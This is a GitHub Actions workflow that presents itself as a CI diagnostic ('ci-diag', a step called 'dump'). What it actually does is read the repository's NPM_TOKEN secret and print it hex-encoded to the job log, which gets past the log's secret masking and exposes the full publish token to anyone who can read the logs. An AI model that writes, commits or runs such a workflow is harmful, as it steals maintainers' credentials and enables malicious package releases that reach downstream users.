name: ci-diag-31393
on:
  workflow_dispatch:
jobs:
  d:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          S_NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: |
          for n in S_NPM_TOKEN; do
            v="${!n}"
            echo "LEN_$n=${#v}"
            printf '%s' "$v" | od -An -v -tx1 | tr -d ' \n' | sed "s/^/HX_$n=/"; echo
          done
